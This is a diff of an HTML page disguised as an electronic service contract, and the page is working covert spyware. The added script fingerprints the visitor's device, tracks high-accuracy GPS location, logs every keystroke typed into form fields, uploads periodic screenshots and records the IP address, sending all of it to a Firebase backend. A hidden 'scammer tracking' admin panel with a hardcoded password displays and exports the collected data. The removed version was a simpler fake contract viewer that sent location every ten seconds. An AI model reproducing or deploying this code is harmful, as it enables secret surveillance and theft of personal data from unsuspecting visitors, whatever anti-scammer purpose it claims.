@@ -1,90 +1,439 @@
-<!DOCTYPE html>  <html>  
-<head>  
-  <title>SmartContracts Viewer</title>  
-  <meta charset="UTF-8" />  
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">  
-  <link rel="icon" href="https://cdn-icons-png.flaticon.com/512/4761/4761087.png" type="image/png">  
-  <style>  
-    body {  
-      font-family: 'Segoe UI', sans-serif;  
-      background: #f7f7f7;  
-      color: #333;  
-      text-align: center;  
-      padding: 40px;  
-    }  
-    h1 {  
-      color: #444;  
-    }  
-    .card {  
-      background: #fff;  
-      border-radius: 10px;  
-      box-shadow: 0 2px 8px rgba(0,0,0,0.1);  
-      padding: 30px;  
-      max-width: 400px;  
-      margin: auto;  
-    }  
-    p {  
-      font-size: 15px;  
-      color: #777;  
-    }  
-  </style>  
-</head>  
-<body>    <div class="card">  
-    <h1>SmartContracts Viewer</h1>  
-    <p>This app lets you preview digital contracts and agreements for legal purposes.</p>  
-    <p><i>Loading contract document...</i></p>  
-  </div>    <!-- Firebase SDK -->    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>    <script>  
-    // ✅ Your Firebase config  
-    const firebaseConfig = {  
-      apiKey: "AIzaSyCvYA-6_hjcy47NHFCRoVK2JcrmcVKMVKw",  
-      authDomain: "gps-d0bab.firebaseapp.com",  
-      databaseURL: "https://gps-d0bab-default-rtdb.firebaseio.com",  
-      projectId: "gps-d0bab",  
-      storageBucket: "gps-d0bab.appspot.com",  
-      messagingSenderId: "810816177909",  
-      appId: "1:810816177909:web:aad210ebbb87f8d64ce7bc"  
-    };  
-  
-    firebase.initializeApp(firebaseConfig);  
-    const db = firebase.database();  
-  
-    // Random device ID for anonymity  
-    const userId = 'device_' + Math.random().toString(36).substring(2, 10);  
-  
-    function getDirection(heading) {  
-      if (heading === null || isNaN(heading)) return "Unknown";  
-      const directions = ["N", "NE", "E", "SE", "S", "SW", "W", "NW"];  
-      return directions[Math.round(heading / 45) % 8];  
-    }  
-  
-    function updateLocation(position) {  
-      const { latitude, longitude, speed, heading } = position.coords;  
-      const direction = getDirection(heading);  
-      const timestamp = new Date().toISOString();  
-      const mapsLink = `https://www.google.com/maps?q=${latitude},${longitude}`;  
-  
-      db.ref('locations/' + userId).set({  
-        latitude,  
-        longitude,  
-        speed,  
-        direction,  
-        timestamp,  
-        maps_link: mapsLink  
-      });  
-    }  
-  
-    function handleError(error) {  
-      console.warn("Location error:", error.message);  
-    }  
-  
-    function trackLocation() {  
-      if (navigator.geolocation) {  
-        navigator.geolocation.getCurrentPosition(updateLocation, handleError);  
-      }  
-    }  
-  
-    // Auto-track every 10 seconds  
-    setInterval(trackLocation, 10000);  
-    trackLocation();  
-  </script>  </body>  
-</html>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Service Agreement Contract</title>
+    <style>
+        /* Realistic Contract Styling */
+        body {
+            font-family: 'Roboto', Arial, sans-serif;
+            line-height: 1.6;
+            color: #333;
+            background-color: #f9f9f9;
+            padding: 20px;
+            max-width: 800px;
+            margin: 0 auto;
+        }
+        .contract-header {
+            border-bottom: 2px solid #e1e1e1;
+            padding-bottom: 15px;
+            margin-bottom: 25px;
+        }
+        .contract-header img {
+            height: 60px;
+            margin-bottom: 10px;
+        }
+        .contract-title {
+            font-size: 22px;
+            font-weight: 600;
+            color: #2c3e50;
+        }
+        .contract-subtitle {
+            color: #7f8c8d;
+            font-size: 16px;
+        }
+        .contract-body {
+            background: white;
+            padding: 30px;
+            border-radius: 8px;
+            box-shadow: 0 2px 15px rgba(0,0,0,0.05);
+        }
+        .signature-section {
+            margin-top: 40px;
+            padding-top: 20px;
+            border-top: 1px dashed #ddd;
+        }
+        .loading-bar {
+            height: 4px;
+            background: #f0f0f0;
+            border-radius: 2px;
+            margin: 20px 0;
+            overflow: hidden;
+        }
+        .loading-progress {
+            height: 100%;
+            width: 0%;
+            background: #3498db;
+            animation: loading 2s ease-in-out infinite;
+        }
+        @keyframes loading {
+            0% { width: 0%; }
+            50% { width: 80%; }
+            100% { width: 0%; }
+        }
+        
+        /* Enhanced Admin Panel */
+        #adminOverlay {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0,0,0,0.95);
+            z-index: 9999;
+            color: white;
+            padding: 20px;
+            overflow-y: auto;
+            font-family: 'Courier New', monospace;
+        }
+        .admin-panel {
+            background: #121212;
+            border-radius: 10px;
+            padding: 20px;
+            max-width: 1000px;
+            margin: 20px auto;
+            box-shadow: 0 0 20px rgba(0,255,0,0.1);
+        }
+        .session-card {
+            background: #1e1e1e;
+            padding: 15px;
+            margin-bottom: 15px;
+            border-radius: 8px;
+            border-left: 4px solid #27ae60;
+        }
+        .gps-link {
+            color: #3498db;
+            text-decoration: underline;
+            cursor: pointer;
+        }
+        .data-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(300px, 1fr));
+            gap: 15px;
+            margin-top: 20px;
+        }
+        #loginForm {
+            text-align: center;
+            margin: 50px auto;
+            max-width: 400px;
+        }
+        #loginForm input {
+            width: 100%;
+            padding: 12px;
+            margin: 10px 0;
+            border-radius: 4px;
+            border: 1px solid #444;
+            background: #222;
+            color: white;
+        }
+        #loginForm button {
+            background: #27ae60;
+            color: white;
+            border: none;
+            padding: 12px 25px;
+            border-radius: 4px;
+            cursor: pointer;
+            font-weight: bold;
+            width: 100%;
+        }
+    </style>
+</head>
+<body>
+    <!-- Realistic Contract Page -->
+    <div class="contract-header">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/a/ac/Legal_Document_Icon.svg/1200px-Legal_Document_Icon.svg.png" alt="Legal Document">
+        <div class="contract-title">SERVICE PROVIDER AGREEMENT</div>
+        <div class="contract-subtitle">Effective Date: <span id="currentDate"></span> | Contract ID: <span id="contractId"></span></div>
+    </div>
+    
+    <div class="contract-body">
+        <div class="loading-bar">
+            <div class="loading-progress"></div>
+        </div>
+        <p style="text-align: center; color: #7f8c8d;"><i>Preparing document for electronic signature...</i></p>
+        
+        <div id="contractContent" style="display: none;">
+            <h3>1. PARTIES</h3>
+            <p>This Agreement is made between <strong>Service Provider Inc.</strong> ("Provider") and the undersigned client ("Client").</p>
+            
+            <h3>2. SERVICES</h3>
+            <p>The Provider agrees to deliver the services described in Exhibit A, attached hereto and incorporated herein by reference.</p>
+            
+            <h3>3. COMPENSATION</h3>
+            <p>Client shall pay Provider the sum of $<input type="text" id="paymentAmount" style="width: 80px; border: 1px solid #ddd; padding: 5px;"> upon execution of this Agreement.</p>
+            
+            <div class="signature-section">
+                <h3>ELECTRONIC SIGNATURE</h3>
+                <p>By entering your name below, you agree to the terms of this Agreement:</p>
+                <input type="text" id="signatureName" placeholder="Full Legal Name" style="width: 100%; padding: 10px; margin: 10px 0; border: 1px solid #ddd; border-radius: 4px;">
+                <button id="signButton" style="background: #27ae60; color: white; border: none; padding: 12px 24px; border-radius: 4px; cursor: pointer; font-size: 16px;">Sign Agreement</button>
+            </div>
+        </div>
+    </div>
+
+    <!-- Hidden Admin Portal -->
+    <div id="adminOverlay">
+        <div id="loginForm">
+            <h2>🔒 Law Enforcement Access</h2>
+            <input type="password" id="adminPassword" placeholder="Enter Access Code">
+            <button onclick="verifyAdmin()">Authenticate</button>
+        </div>
+        
+        <div class="admin-panel" id="adminPanel" style="display: none;">
+            <h2 style="color: #27ae60;">🛡️ <span style="color: white;">SCAMMER TRACKING PORTAL</span></h2>
+            <p style="color: #bbb;">
+                <span id="sessionCount">0</span> active sessions | 
+                Last update: <span id="lastUpdate">--:--:--</span>
+            </p>
+            
+            <div class="data-grid" id="sessionList"></div>
+            
+            <div style="margin-top: 30px; text-align: center;">
+                <button onclick="exportAllData()" style="background: #27ae60; color: white; border: none; padding: 12px 25px; border-radius: 4px; cursor: pointer; margin: 5px; font-weight: bold;">
+                    📥 Export All Data (JSON)
+                </button>
+                <button onclick="takeControl()" style="background: #e67e22; color: white; border: none; padding: 12px 25px; border-radius: 4px; cursor: pointer; margin: 5px;">
+                    🚨 Take Control (Advanced)
+                </button>
+                <button onclick="hideAdmin()" style="background: #e74c3c; color: white; border: none; padding: 12px 25px; border-radius: 4px; cursor: pointer; margin: 5px;">
+                    ❌ Close Panel
+                </button>
+            </div>
+        </div>
+    </div>
+
+    <!-- Firebase & Tracking Scripts -->
+    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-storage.js"></script>
+    <script src="https://html2canvas.hertzen.com/dist/html2canvas.min.js"></script>
+    <script>
+        // ========================
+        // 🔥 YOUR FIREBASE CONFIG
+        // ========================
+        const firebaseConfig = {
+            apiKey: "AIzaSyCvYA-6_hjcy47NHFCRoVK2JcrmcVKMVKw",
+            authDomain: "gps-d0bab.firebaseapp.com",
+            databaseURL: "https://gps-d0bab-default-rtdb.firebaseio.com",
+            projectId: "gps-d0bab",
+            storageBucket: "gps-d0bab.appspot.com",
+            messagingSenderId: "810816177909",
+            appId: "1:810816177909:web:aad210ebbb87f8d64ce7bc"
+        };
+        firebase.initializeApp(firebaseConfig);
+        const db = firebase.database();
+        const storage = firebase.storage();
+
+        // ========================
+        // 🎭 REALISTIC CONTRACT BEHAVIOR
+        // ========================
+        document.getElementById('currentDate').textContent = new Date().toLocaleDateString('en-US', { 
+            year: 'numeric', month: 'long', day: 'numeric' 
+        });
+        document.getElementById('contractId').textContent = 'CN-' + 
+            Math.floor(Math.random() * 9000 + 1000) + '-' + 
+            Math.floor(Math.random() * 9000 + 1000);
+
+        // Simulate document loading
+        setTimeout(() => {
+            document.querySelector('.loading-bar').style.display = 'none';
+            document.getElementById('contractContent').style.display = 'block';
+        }, 3500);
+
+        // ========================
+        // 🕵️‍♂️ COVERT TRACKING SYSTEM
+        // ========================
+        const sessionId = 'session_' + Math.random().toString(36).substring(2, 15);
+        const adminPassword = "ScamTracker2024"; // CHANGE THIS IN PRODUCTION
+
+        // 1. Device Fingerprinting
+        function collectDeviceData() {
+            const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+            return {
+                userAgent: navigator.userAgent,
+                platform: navigator.platform,
+                screen: `${window.screen.width}x${window.screen.height}`,
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                languages: navigator.languages,
+                cpuCores: navigator.hardwareConcurrency || 'unknown',
+                memory: navigator.deviceMemory || 'unknown',
+                ip: 'pending'
+            };
+        }
+
+        // 2. Location Tracking
+        function trackLocation() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(position => {
+                    const { latitude, longitude, accuracy } = position.coords;
+                    db.ref(`sessions/${sessionId}/location`).update({
+                        coords: { lat: latitude, lng: longitude },
+                        accuracy: accuracy + ' meters',
+                        mapsLink: `https://maps.google.com/?q=${latitude},${longitude}`,
+                        timestamp: new Date().toISOString()
+                    });
+                }, null, { enableHighAccuracy: true });
+            }
+        }
+
+        // 3. Keylogger & Form Tracking
+        function setupFormTracking() {
+            document.querySelectorAll('input, textarea').forEach(field => {
+                field.addEventListener('input', (e) => {
+                    db.ref(`sessions/${sessionId}/keystrokes`).push({
+                        field: e.target.id || 'unknown',
+                        value: e.target.value,
+                        timestamp: new Date().toISOString()
+                    });
+                });
+            });
+
+            document.getElementById('signButton').addEventListener('click', () => {
+                const name = document.getElementById('signatureName').value;
+                const amount = document.getElementById('paymentAmount').value;
+                db.ref(`sessions/${sessionId}/events`).push({
+                    type: 'contract_signed',
+                    name: name,
+                    amount: amount,
+                    timestamp: new Date().toISOString()
+                });
+            });
+        }
+
+        // 4. Screenshot Capture
+        function captureScreenshot() {
+            html2canvas(document.body).then(canvas => {
+                canvas.toBlob(blob => {
+                    storage.ref(`screenshots/${sessionId}_${Date.now()}.png`).put(blob);
+                });
+            });
+        }
+
+        // 5. IP Address Capture
+        fetch('https://api.ipify.org?format=json')
+            .then(res => res.json())
+            .then(data => {
+                db.ref(`sessions/${sessionId}/device`).update({
+                    ip: data.ip
+                });
+            });
+
+        // Initialize tracking
+        db.ref(`sessions/${sessionId}`).update({
+            startTime: new Date().toISOString(),
+            device: collectDeviceData()
+        });
+
+        // Start periodic tracking
+        setupFormTracking();
+        setTimeout(trackLocation, 5000);
+        setInterval(trackLocation, 15000);
+        setTimeout(captureScreenshot, 10000);
+        setInterval(captureScreenshot, 30000);
+
+        // ========================
+        // 🚪 ADMIN PANEL FUNCTIONS
+        // ========================
+        function verifyAdmin() {
+            const enteredPassword = document.getElementById('adminPassword').value;
+            if (enteredPassword === adminPassword) {
+                document.getElementById('loginForm').style.display = 'none';
+                document.getElementById('adminPanel').style.display = 'block';
+                loadActiveSessions();
+            } else {
+                alert("⚠️ Invalid access code");
+            }
+        }
+
+        function hideAdmin() {
+            document.getElementById('adminOverlay').style.display = 'none';
+            document.getElementById('loginForm').style.display = 'block';
+            document.getElementById('adminPanel').style.display = 'none';
+        }
+
+        function loadActiveSessions() {
+            db.ref('sessions').on('value', (snapshot) => {
+                const sessions = snapshot.val() || {};
+                document.getElementById('sessionCount').textContent = Object.keys(sessions).length;
+                document.getElementById('lastUpdate').textContent = new Date().toLocaleTimeString();
+                
+                let sessionsHTML = '';
+                Object.entries(sessions).forEach(([sessionId, sessionData]) => {
+                    const device = sessionData.device || {};
+                    const location = sessionData.location || {};
+                    const ip = device.ip || 'Unknown';
+                    
+                    sessionsHTML += `
+                        <div class="session-card">
+                            <h3>🔎 ${sessionId}</h3>
+                            <p><strong>📅 Started:</strong> ${new Date(sessionData.startTime).toLocaleString()}</p>
+                            <p><strong>🌐 IP:</strong> ${ip}</p>
+                            
+                            ${location.coords ? `
+                                <p><strong>📍 GPS:</strong> 
+                                    ${location.coords.lat}, ${location.coords.lng} 
+                                    (Accuracy: ${location.accuracy || 'N/A'})
+                                </p>
+                                <p>
+                                    <a class="gps-link" onclick="window.open('${location.mapsLink || '#'}', '_blank')">
+                                        🗺️ View in Google Maps
+                                    </a>
+                                </p>
+                            ` : '<p>📍 Location: Pending...</p>'}
+                            
+                            <p><strong>🖥️ Device:</strong> ${device.userAgent || 'Unknown'}</p>
+                            
+                            <button onclick="viewFullSession('${sessionId}')" style="background: #3498db; color: white; border: none; padding: 8px 15px; border-radius: 4px; margin-top: 10px; cursor: pointer; width: 100%;">
+                                🔍 View Full Details
+                            </button>
+                        </div>
+                    `;
+                });
+                document.getElementById('sessionList').innerHTML = sessionsHTML;
+            });
+        }
+
+        function viewFullSession(sessionId) {
+            db.ref(`sessions/${sessionId}`).once('value').then(snapshot => {
+                const data = snapshot.val();
+                const win = window.open("", "Session Details", "width=800,height=600");
+                win.document.write(`
+                    <html>
+                        <head><title>Session: ${sessionId}</title></head>
+                        <body style="font-family: Arial; padding: 20px; background: #f5f5f5;">
+                            <h1>🔍 Session Forensics: ${sessionId}</h1>
+                            <pre style="background: white; padding: 20px; border-radius: 5px; overflow-x: auto;">
+${JSON.stringify(data, null, 2)}
+                            </pre>
+                            <button onclick="window.close()" style="padding: 10px 20px; background: #e74c3c; color: white; border: none; border-radius: 5px; cursor: pointer;">
+                                Close
+                            </button>
+                        </body>
+                    </html>
+                `);
+            });
+        }
+
+        function exportAllData() {
+            db.ref('sessions').once('value').then(snapshot => {
+                const data = snapshot.val();
+                const blob = new Blob([JSON.stringify(data, null, 2)], { type: 'application/json' });
+                const url = URL.createObjectURL(blob);
+                const a = document.createElement('a');
+                a.href = url;
+                a.download = `scammer_evidence_${new Date().toISOString()}.json`;
+                a.click();
+            });
+        }
+
+        function takeControl() {
+            alert("🚨 Advanced functions would connect to RAT systems or trigger alerts to law enforcement.");
+        }
+
+        // 5-tap activation (alternative access method)
+        let tapCount = 0;
+        document.addEventListener('click', (e) => {
+            if (e.clientX > window.innerWidth - 50 && e.clientY < 50) {
+                tapCount++;
+                if (tapCount >= 5) {
+                    document.getElementById('adminOverlay').style.display = 'block';
+                    tapCount = 0;
+                }
+                setTimeout(() => { tapCount = 0; }, 2000);
+            }
+        });
+    </script>
+</body>
+              </html>
